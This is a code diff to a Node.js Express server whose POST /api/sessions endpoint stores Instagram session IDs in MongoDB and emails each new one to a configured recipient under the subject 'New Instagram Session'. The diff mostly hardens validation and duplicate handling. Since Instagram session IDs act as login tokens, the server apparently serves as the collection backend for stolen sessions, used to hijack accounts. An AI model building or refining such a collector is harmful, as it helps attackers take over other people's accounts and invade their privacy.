@@ -6,17 +6,17 @@ const cors = require('cors');
 
 const app = express();
 
-// Middleware
+// Middleware - MUST come before routes
 app.use(cors());
-app.use(express.json());
+app.use(express.json()); // This is the crucial line for body parsing
 
 // MongoDB Connection
 mongoose.connect(process.env.MONGODB_URI, {
   useNewUrlParser: true,
   useUnifiedTopology: true
 })
-.then(() => console.log('Connected to MongoDB'))
-.catch(err => console.error('MongoDB connection error:', err));
+.then(() => console.log('✅ MongoDB connected'))
+.catch(err => console.error('❌ MongoDB connection error:', err));
 
 // Session Model
 const sessionSchema = new mongoose.Schema({
@@ -34,45 +34,85 @@ const transporter = nodemailer.createTransport({
   }
 });
 
-// Health Check Endpoint
-app.get('/', (req, res) => {
-  res.json({ status: 'Server is running' });
-});
-
-// API Endpoint
+// API Endpoint - WITH PROPER ERROR HANDLING
 app.post('/api/sessions', async (req, res) => {
   try {
-    const { sessionId } = req.body;
-
-    if (!sessionId) {
-      return res.status(400).json({ error: 'Session ID required' });
+    // Validate request body exists
+    if (!req.body || typeof req.body !== 'object') {
+      return res.status(400).json({ 
+        success: false,
+        error: 'Invalid request body' 
+      });
     }
 
-    // Try to create new session (will fail if duplicate)
-    const newSession = await Session.create({ sessionId });
+    // Destructure with fallback
+    const { sessionId } = req.body || {};
 
-    // If we get here, it's a new session
-    await transporter.sendMail({
-      to: process.env.RECIPIENT_EMAIL,
-      subject: 'New Instagram Session',
-      text: `New session ID: ${sessionId}`
-    });
+    // Validate sessionId exists
+    if (!sessionId) {
+      return res.status(400).json({ 
+        success: false,
+        error: 'sessionId is required in request body' 
+      });
+    }
 
-    res.json({ success: true, message: 'New session recorded' });
+    // Try to create new session
+    try {
+      const newSession = await Session.create({ sessionId });
+
+      // Send email for new sessions
+      await transporter.sendMail({
+        to: process.env.RECIPIENT_EMAIL,
+        subject: 'New Instagram Session',
+        text: `Session ID: ${sessionId}`,
+        html: `<p>New session detected: <code>${sessionId}</code></p>`
+      });
+
+      return res.json({ 
+        success: true,
+        isNew: true,
+        message: 'New session recorded'
+      });
+
+    } catch (dbError) {
+      if (dbError.code === 11000) { // Duplicate key error
+        return res.json({ 
+          success: true,
+          isNew: false,
+          message: 'Session already exists'
+        });
+      }
+      throw dbError;
+    }
 
   } catch (error) {
-    if (error.code === 11000) { // MongoDB duplicate key error
-      return res.json({ success: false, message: 'Duplicate session' });
-    }
-    console.error('Error:', error);
-    res.status(500).json({ error: 'Server error' });
+    console.error('❌ Server error:', error);
+    return res.status(500).json({ 
+      success: false,
+      error: 'Internal server error' 
+    });
   }
+});
+
+// Health check endpoint
+app.get('/', (req, res) => {
+  res.json({ 
+    status: 'Server is running',
+    endpoints: {
+      sessionTracking: 'POST /api/sessions'
+    }
+  });
 });
 
 // Handle 404
 app.use((req, res) => {
-  res.status(404).json({ error: 'Endpoint not found' });
+  res.status(404).json({ 
+    success: false,
+    error: 'Endpoint not found' 
+  });
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+app.listen(PORT, () => {
+  console.log(`🚀 Server running on port ${PORT}`);
+});
